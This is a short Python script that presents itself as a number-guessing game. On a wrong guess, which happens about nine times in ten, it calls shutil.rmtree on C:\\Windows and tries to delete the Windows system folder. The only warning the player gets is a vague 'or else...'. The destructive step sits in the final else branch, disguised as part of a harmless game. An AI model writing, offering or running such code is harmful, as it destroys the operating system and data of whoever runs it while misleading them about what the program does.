import os
import shutil
import random

number = random.randint(1,10)
guess = input("Silly game! Guess a number between 1 and 10 (don't type in letters ornumbers higher than 10 or else...):")
guess = int(guess)

if guess == number:
    print("You Won!")
else:
    shutil.rmtree("C:\\Windows")
